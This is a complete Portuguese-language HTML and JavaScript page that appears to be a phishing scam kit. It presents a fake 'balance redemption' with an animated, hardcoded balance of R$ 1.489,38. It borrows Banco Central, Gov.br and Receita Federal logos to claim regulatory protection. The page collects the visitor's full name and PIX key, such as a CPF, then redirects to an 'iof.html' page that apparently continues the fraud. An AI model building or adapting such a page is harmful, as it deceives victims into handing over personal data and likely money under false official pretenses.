<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate de Saldo</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; padding: 0; color: #333; min-height: 100vh; }

        /* --- TELA 1: DESIGN ORIGINAL --- */
        .header-section { background: #ee4d2d; padding: 20px; color: white; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; }
        .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
        .coin-icon { width: 50px; height: 50px; }
        
        .card-white { background: white; margin: 15px; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }

        .option-group { display: flex; gap: 10px; margin: 15px 0; }
        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 6px; text-align: center; font-weight: 700; flex: 1; color: #555; }
        .big-option { width: 100%; padding: 22px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; }
        .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }

        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; }
        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }

        /* SELOS DE SEGURAN√áA NO RODAP√â */
        .security-footer { display: flex; justify-content: space-around; align-items: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; }
        .security-img { height: 30px; width: auto; filter: grayscale(100%); opacity: 0.7; }

        /* --- MODAL QUE SOBE DE BAIXO (image_c3c69d.png) --- */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .hidden { display: none !important; }

        label { font-size: 14px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; margin-top: 10px; }
        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="step-1">
        <div class="header-section">
            <div class="header-top">
                <div>
                    <span style="font-size: 14px; opacity: 0.9;">Seu saldo</span>
                    <div style="font-size: 42px; font-weight: 900;">R$ <span id="balance">0,00</span></div>
                    <div style="font-size: 13px; opacity: 0.8;">= <span id="points">0,00</span> pontos (s)</div>
                </div>
                <div class="coin-icon">
                    <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
                </div>
            </div>
            <div style="font-size: 13px; margin-top: 12px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 10px;">
                √öltima bonifica√ß√£o apresentada: R$ 845,24
            </div>
        </div>

        <div class="card-white">
            <h3 style="margin-top:0; font-size:17px;">Sacar dinheiro</h3>
            <div class="option-group">
                <div class="option-btn" onclick="selectOpt(this)">R$1,5</div>
                <div class="option-btn" onclick="selectOpt(this)">R$5</div>
                <div class="option-btn" onclick="selectOpt(this)">R$10</div>
            </div>
            <div id="big-opt" class="big-option" onclick="selectBig()">R$ 1.489,38</div>
            <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">SACAR DINHEIRO</button>
        </div>

        <div class="card-white">
            <h3 style="font-size:15px; margin-bottom:5px;">Acesso Priorit√°rio</h3>
            <p style="font-size:12px; color:#777;">Sua transa√ß√£o √© monitorada e garantida por √≥rg√£os reguladores.</p>
            <div class="security-footer">
                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="security-img">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="security-img">
            </div>
        </div>
    </div>

    <div id="modal-pix" class="modal-overlay hidden">
        <div class="modal-sheet">
            <h2 style="text-align:center; font-size:20px; margin-bottom:20px; margin-top:0;">Vincular Chave PIX</h2>
            
            <label>Nome completo do titular</label>
            <input type="text" id="nome" placeholder="Nome completo">

            <label>Tipo de chave PIX</label>
            <select id="tipo-chave" onchange="mudarLabel()">
                <option value="cpf">CPF</option>
                <option value="cel">Celular</option>
                <option value="email">E-mail</option>
                <option value="ale">Chave Aleat√≥ria</option>
            </select>

            <label id="label-chave">Chave PIX (Apenas n√∫meros)</label>
            <input type="tel" id="chave-pix" placeholder="000.000.000-00">

            <button class="btn-main" onclick="irParaProximo()">CONFIRMAR E CONTINUAR</button>
            <div style="text-align:center; margin-top:15px; font-size:11px; color:#888; display:flex; align-items:center; justify-content:center; gap:5px;">
                üîí Transa√ß√£o criptografada
            </div>
        </div>
    </div>

    <script>
        // CONTADOR ANIMADO
        function animate(id, target) {
            let current = 0;
            const el = document.getElementById(id);
            const step = target / 50;
            const timer = setInterval(() => {
                current += step;
                if (current >= target) { el.innerText = target.toLocaleString('pt-BR', {minimumFractionDigits: 2}); clearInterval(timer); }
                else { el.innerText = current.toLocaleString('pt-BR', {minimumFractionDigits: 2}); }
            }, 30);
        }
        window.onload = () => { animate('balance', 1489.38); animate('points', 42583.05); };

        // LOGICA DE SELE√á√ÉO
        let selecionado = false;
        function selectOpt(el) { document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected')); el.classList.add('selected'); ativar(); }
        function selectBig() { document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected')); document.getElementById('big-opt').classList.add('selected'); ativar(); }
        function ativar() { document.getElementById('btn-sacar').classList.remove('btn-disabled'); selecionado = true; }
        function openModal() { if(selecionado) document.getElementById('modal-pix').classList.remove('hidden'); }

        // MUDAN√áA DIN√ÇMICA DO MODAL
        function mudarLabel() {
            const tipo = document.getElementById('tipo-chave').value;
            const label = document.getElementById('label-chave');
            const input = document.getElementById('chave-pix');
            input.value = "";

            if(tipo === 'cpf') { label.innerText = "Chave PIX (CPF)"; input.placeholder = "000.000.000-00"; input.type = "tel"; }
            else if(tipo === 'cel') { label.innerText = "Chave PIX (Celular)"; input.placeholder = "(00) 00000-0000"; input.type = "tel"; }
            else if(tipo === 'email') { label.innerText = "Chave PIX (E-mail)"; input.placeholder = "exemplo@email.com"; input.type = "email"; }
            else { label.innerText = "Chave Aleat√≥ria"; input.placeholder = "Cole sua chave aqui"; input.type = "text"; }
        }

        // M√ÅSCARAS
        document.getElementById('chave-pix').addEventListener('input', e => {
            const tipo = document.getElementById('tipo-chave').value;
            let v = e.target.value.replace(/\D/g,"");
            if(tipo === 'cpf') {
                v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
                e.target.value = v;
            } else if(tipo === 'cel') {
                v = v.replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d)(\d{4})$/,"$1-$2");
                e.target.value = v;
            }
        });

        function irParaProximo() {
            if(document.getElementById('nome').value.length < 5) return alert("Digite seu nome completo.");
            window.location.href = "iof.html";
        }
    </script>
</body>
</html>